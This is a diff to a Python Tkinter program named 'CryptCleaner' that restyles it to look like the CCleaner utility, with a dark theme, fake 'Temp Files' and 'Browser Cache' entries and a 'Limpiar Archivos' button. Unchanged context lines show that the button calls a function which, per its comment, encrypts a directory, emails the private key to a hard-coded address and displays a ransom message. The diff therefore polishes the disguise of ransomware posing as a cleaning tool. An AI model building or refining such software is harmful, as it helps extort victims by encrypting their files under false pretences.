@@ -21,27 +21,27 @@ recipient_email = "tccsmtp12@gmail.com"  # Cambia por el email de destino
 root = tk.Tk()
 root.title("CryptCleaner")
 root.geometry("1200x700")
-root.configure(bg="#f8f9fa")  # Fondo principal
+root.configure(bg="#2e2e2e")  # Fondo oscuro
 
 # Cambiar el ícono de la barra de tareas
 icon_path = ICONS_DIR / "app_icon.ico"  # Cambia el nombre del archivo si es necesario
 root.iconbitmap(str(icon_path))  # Usar el icono en formato .ico para la barra de tareas
 
 # Configurar estilos globales
-FONT_TITLE = ("Arial", 20, "bold")
-FONT_TEXT = ("Arial", 14)
-PRIMARY_COLOR = "#007bff"
-SECONDARY_COLOR = "#6c757d"
-BACKGROUND_COLOR = "#f8f9fa"
-BUTTON_COLOR = "#28a745"
-BUTTON_HOVER_COLOR = "#218838"
+FONT_TITLE = ("Segoe UI", 20, "bold")
+FONT_TEXT = ("Segoe UI", 12)
+PRIMARY_COLOR = "#3e8e41"  # Verde brillante similar a CCleaner
+SECONDARY_COLOR = "#e0e0e0"  # Gris claro
+BACKGROUND_COLOR = "#2e2e2e"  # Fondo oscuro
+BUTTON_COLOR = "#4caf50"  # Botón verde brillante
+BUTTON_HOVER_COLOR = "#45a049"
 
 # Configurar la ventana
 root.grid_rowconfigure(0, weight=1)
 root.grid_columnconfigure(1, weight=1)
 
 # Crear el frame del menú en el lado izquierdo
-menu_frame = tk.Frame(root, width=300, bg=PRIMARY_COLOR)
+menu_frame = tk.Frame(root, width=250, bg=PRIMARY_COLOR)
 menu_frame.grid(row=0, column=0, sticky="ns")
 
 # Crear el frame principal para el contenido en el centro
@@ -60,22 +60,22 @@ def load_image(path, size=(35, 35)):
 
 # Cargar los íconos para el menú
 icons = {
-    "Configuración": load_image(ICONS_DIR / "settings.png"),
-    "Drivers": load_image(ICONS_DIR / "drivers.png"),
-    "Limpieza": load_image(ICONS_DIR / "clean.png"),
-    "Análisis": load_image(ICONS_DIR / "analytics.png"),
-    "Optimización": load_image(ICONS_DIR / "optimize.png"),
-    "Historial": load_image(ICONS_DIR / "history.png"),
-    "Soporte": load_image(ICONS_DIR / "support.png")
+    "Configuración": load_image(ICONS_DIR / "gear-solid.png"),
+    "Drivers": load_image(ICONS_DIR / "screwdriver-wrench-solid.png"),
+    "Limpieza": load_image(ICONS_DIR / "brush-solid.png"),
+    "Análisis": load_image(ICONS_DIR / "chart-line-solid.png"),
+    "Optimización": load_image(ICONS_DIR / "gauge-high-solid.png"),
+    "Historial": load_image(ICONS_DIR / "clock-rotate-left-solid.png"),
+    "Soporte": load_image(ICONS_DIR / "headset-solid.png")
 }
 
 # Añadir botones con íconos al menú
 for text, icon in icons.items():
     btn = tk.Button(menu_frame, image=icon, text=text, compound="left", font=FONT_TEXT,
                     command=lambda t=text: show_message(t), bg=PRIMARY_COLOR, fg="white",
-                    activebackground=PRIMARY_COLOR, relief="flat", anchor="w")
+                    activebackground=PRIMARY_COLOR, relief="flat", anchor="w", padx=20, pady=10)
     btn.image = icon
-    btn.pack(fill="x", padx=10, pady=5, ipady=10)
+    btn.pack(fill="x", padx=5, pady=5)
 
 # Función para encriptar el directorio, enviar la clave privada, y mostrar el mensaje de rescate
 def limpiar_archivos():
@@ -122,19 +122,30 @@ def show_ransom_message():
                                bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR)
     decrypt_button.pack(pady=20)
 
-# Botón circular central para limpiar archivos
-large_icon = load_image(ICONS_DIR / "clean.png", size=(60, 60))
+# Crear iconos simulados de directorios y archivos para limpieza
+file_icons = {
+    "Temp Files": load_image(ICONS_DIR / "folder-open-solid.png"),
+    "Old Documents": load_image(ICONS_DIR / "file-lines-solid.png"),
+    "Browser Cache": load_image(ICONS_DIR / "cloud-arrow-down-solid.png"),
+    "Log Files": load_image(ICONS_DIR / "file-csv-solid.png"),
+}
 
-circle_canvas = tk.Canvas(content_frame, width=120, height=120, bg=BACKGROUND_COLOR, highlightthickness=0)
-circle_canvas.place(relx=0.5, rely=0.4, anchor="center")
-circle_canvas.create_oval(10, 10, 110, 110, fill=PRIMARY_COLOR, outline="")
-circle_canvas.image = large_icon
-circle_canvas.create_image(60, 60, image=large_icon)
-circle_canvas.bind("<Button-1>", lambda e: limpiar_archivos())
+# Mostrar directorios en el centro
+y_position = 20
+for directory, icon in file_icons.items():
+    dir_button = tk.Button(content_frame, image=icon, text=directory, compound="left", font=FONT_TEXT,
+                           bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR, relief="flat", anchor="w", padx=20, pady=10)
+    dir_button.image = icon
+    dir_button.place(x=50, y=y_position)
+    y_position += 50  # Espacio para cada directorio
 
-# Etiqueta debajo del círculo
-label_text = tk.Label(content_frame, text="Limpiar archivos basura", font=FONT_TITLE, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR)
-label_text.place(relx=0.5, rely=0.5, anchor="n")
+# Botón rectangular central para limpiar archivos
+large_icon = load_image(ICONS_DIR / "brush-solid.png", size=(30, 30))
+
+rect_button = tk.Button(content_frame, text="Limpiar Archivos", command=limpiar_archivos, font=FONT_TEXT,
+                        bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR, relief="flat",
+                        width=20, height=2)
+rect_button.place(relx=0.95, rely=0.95, anchor="se", x=-20, y=-20)  # Ajuste de margen con x e y
 
 # Ejecutar la interfaz gráfica
 if __name__ == "__main__":
